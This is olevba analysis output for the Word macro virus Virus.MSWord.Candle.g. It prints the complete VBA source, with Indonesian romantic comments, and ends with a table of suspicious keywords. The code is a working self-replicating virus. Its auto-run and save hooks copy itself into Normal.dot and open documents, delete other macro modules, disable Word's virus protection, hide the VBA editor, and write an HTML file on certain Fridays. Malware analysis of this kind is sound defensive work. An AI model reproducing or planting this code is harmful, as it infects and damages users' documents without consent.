olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Candle.g-593f8f6fe86babcc90092c422f943cb2245f657f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Candle.g-593f8f6fe86babcc90092c422f943cb2245f657f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Candle.bas 
in file: Virus.MSWord.Candle.g-593f8f6fe86babcc90092c422f943cb2245f657f - OLE stream: 'Macros/VBA/Candle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' atmospir Indy manis, I N D O N E S I A, awal Nopember 1997
Const siManis = "Candle" ' Gen11.2-II
Dim sebarkanPesankuIni As Boolean ' Let me live in your medias :-(
Dim cDA, anggota, utusan ' Don't kill me, I am weak and harmless..

' M Y  O N L Y  L O V E  S T U C K  O N  A G E T I Q U E T T E
' - -  - - - -  - - - -  - - - - -  - -  - - - - - - - - - - -
'*is it fair?
' saat ge and Ii saling suka and jatuh cinta even kami berdua ingin
' married,  but  her mother  is forbide  our love  yang tulus  tobe
' united, padahal ge and Ii udah sebegitu ehem ehemnya..
'*sounds tragic! how come?
' her mother doesn't like cowo manapun yang nggak lebih tua minimal
' five years than her daughter untuk  pacaran  and married!  beside
' that kelihatannya ada another reason yang ge nggak tahu..
'*well?
' ge memang older than Ii, tapi only 9 months, Ii lahirnya Maret'77
' and ge Juli'76.
'*so what?
' that's not enough! said her mother.
'*and now?
' ge pikir now Ii is trying 'tuk memenuhi her mother's wish, and ge
' jadi takut.. takut Ii jadi berpaling dari cinta kami.. sniff!
'*so?
' apapun yang terjadi bagaimanapun juga ge bakalan berusaha  sampai
' ge dapetin cintanya Ii! karena yang ge tau kalo Ii juga 'gak rela
' wadda ya thinx?
'*you do fall in love, don't you?
' ..iya lah, kalo nggak, mana mungkin you bisa baca ps ps brkt ini!

Sub AutoExec()
  If (Day(Now) = 1) And (WeekDay(Now) = vbFriday) Then
  ' kalo gue bilang gue suka sama kakak kelas gue, gimana?
  ' percuma deh loe nggak bakal tahu biarpun gue kasih tahu namanya..
    CandleA
  ElseIf (Day(Now) = 22) And (WeekDay(Now) = vbFriday) Then
  ' kalau kamu masih .. sama .. lebih baik kamu keluar dari rumah ini
  ' mulai sekarang kamu jangan .. dia lagi!
  ' janji? iya
  ' (and Ii cryin' alone as her mother leavin')
    CandleA
  ' sudahlah, jangan menangis sayang..
  ' Ii sayang,
  ' thanks, your tears menandakan perasaan Ii yang begitu dalam,
  ' ge nggak akan membuat setiap tetes air mata Ii sia - sia,
  ' ge akan menghapus air mata kesedihan yang ada di pelupuk mata
  ' Ii, dan ge akan berusaha membuatnya menjadi linangan air mata
  ' kebahagiaan.. semoga saja..
  ' you are too sweet to let go, I'm too love to loose
  End If
End Sub
Sub AutoOpen()
  If Application.ShowVisualBasicEditor Then
    Application.ShowVisualBasicEditor = False
  End If
  If (Day(Now) = 1) And (WeekDay(Now) = vbFriday) Then
  ' (0251), Jum'at, 1 Agustus 1997, 1400-1530
    CandleA
  ElseIf (Day(Now) = 22) And (WeekDay(Now) = vbFriday) Then
  ' (0251), Jum'at, 22 Agustus 1997, 1630-1800
    CandleA
  ' Yesterday, all my trouble seem so far away
  End If
  CandleN
End Sub
Sub FileSave()
  On Error Resume Next
  ActiveDocument.Save
  CandleD
End Sub
Sub FileSaveAs()
  On Error Resume Next
  With Dialogs(wdDialogFileSaveAs)
    .Format = wdFormatDocument
    If .Display = -1 Then
      ActiveDocument.SaveAs FileName:=.Name, FileFormat:=wdFormatTemplate
      CandleD
    End If
  End With
End Sub
Sub ToolsMacro()
' Candle, Yellow Rose, Indy.. romantism never ends
End Sub
Sub ViewVBcode()
' 3 jam 3 menit 33 detik
' what I want most to you is to get close to you..
End Sub
Sub HelpWordPerfectHelp()
' Mawar Kuning,
' akankah hembusan angin ragu mengarahkan harummu
' berpaling dari cintaku,
' adakah duri mawarmu yang akan menyakitiku,
' yang kutahu pasti pesonamu akan selalu menawanku..
End Sub
Sub ToolsOptions()
  On Error Resume Next
  Options.VirusProtection = True
  Dialogs(wdDialogToolsOptions).Show
  Options.VirusProtection = False
End Sub
Sub AutoClose()
  CandleD ' friends come into lovers
End Sub
Public Sub CandleA()
  Dim RelungHatiku As String
  Application.StatusBar = "Page Reformatting.. (this may take a few minutes)"
  With Application.FileSearch
    .SearchSubFolders = True
    .FileName = "Welcome.EXE"
    .LookIn = "C:\"
    .Execute
    Application.StatusBar = ""
    If .FoundFiles.Count = 1 Then


        Print #1, "<body text=gray bgcolor=white><basefont size=3>"
        Print #1, "<tt><center><p><font size=+2><b>Jangan padamkan..</b></font><p>"
        Print #1, "ternyata penglihatanku salah non,<br>"
        Print #1, "ternyata kisah kita bukanlah sekedar lampu temaram,<br>"
        Print #1, "ternyata setelah kulihat dari dekat,<br>"
        Print #1, "ternyata hanyalah sebatang lilin kecil yang menyala redup<p>"
        Print #1, "duh tiupan angin yang membuat nyalanya semakin meredup membuatku miris,<br>"
        Print #1, "kuletakkan kedua telapak tanganku melingkari nyalanya,<br>"
        Print #1, "melindunginya supaya tiada lagi datang gelapku<p>"
        Print #1, "walau ku berusaha membuang pikiran burukku jauh - jauh,<br>"
        Print #1, "tak urung aku merasakan tiupan perlahan darimu untuk meredupkan nyalanya,<br>"
        Print #1, "hembusanmu menyelinap di jemari tanganku, terasa dingin<br>"
        Print #1, "namun masih kurasakan hangatnya nyala lilin kecil itu<p>"
        Print #1, "jangan kamu hembus nyala lilin itu,<br>"
        Print #1, "lilin kecil itu<p>"
        Print #1, "nyalanya sesekali bergoyang seakan hendak meninggalkan lilin itu,<br>"
        Print #1, "tidakkah kamu lihat, betapa seakan dia berkata kepada kita<br>"
        Print #1, Chr(34) + "jangan padamkan aku... karena aku ada di dalam hatimu... di dalam hati kalian berdua<p>"
        Print #1, "</center></tt><br><font size=-1>buat Ii tersayang di FKG UNPAD 45363,<br>"
        Print #1, "bahkan tulisankupun menjadi kelam, sekelam hatiku yang terombang ambing tiada menentu<br>"
        Print #1, "jadilah kamu lenteraku, lentera yang tiada kan pernah pudar mendampingiku, lentera tempatku menuju...<p>"
        Print #1, "</body></html>"
      Close
    End If
  End With
End Sub
Public Sub CandleN()
  cDA = Application.DisplayAlerts
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False
  On Error GoTo bukanSalahKu
  sebarkanPesankuIni = True
  For Each anggota In NormalTemplate.VBProject.VBComponents
    If Left(anggota.Name, 6) = "Candle" Then
      sebarkanPesankuIni = False
    ElseIf anggota.Name = "ThisDocument" Then
    ElseIf Left(anggota.Name, 2) = "ai" Then
    Else
      Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=anggota.Name, object:=wdOrganizerObjectProjectItems
      Options.SaveNormalPrompt = False
      NormalTemplate.Save
    End If
  Next
  If sebarkanPesankuIni Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=siManis, object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
    NormalTemplate.Save
  End If
bukanSalahKu:
  Application.DisplayAlerts = cDA
  Application.ScreenUpdating = True
End Sub
Public Sub CandleD()
  cDA = Application.DisplayAlerts
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False
  On Error GoTo bukanSalahMuJuga
  For Each utusan In Documents
    sebarkanPesankuIni = True
    For Each anggota In utusan.VBProject.VBComponents
      If Left(anggota.Name, 6) = "Candle" Then
        sebarkanPesankuIni = False
      ElseIf anggota.Name = "ThisDocument" Then
      ElseIf Left(anggota.Name, 2) = "ai" Then
      Else
        Application.OrganizerDelete Source:=utusan.FullName, Name:=anggota.Name, object:=wdOrganizerObjectProjectItems
      End If
    Next
    If sebarkanPesankuIni And (Left(utusan.Name, 3) <> "Doc") Then
      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=utusan.FullName, Name:=siManis, object:=wdOrganizerObjectProjectItems
    End If
  Next
  If Left(ActiveDocument.Name, 3) <> "Doc" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
  End If
bukanSalahMuJuga:
  Application.DisplayAlerts = cDA
  Application.ScreenUpdating = True
End Sub

' in the name of love, of Aa & Ii
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Welcome.EXE         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

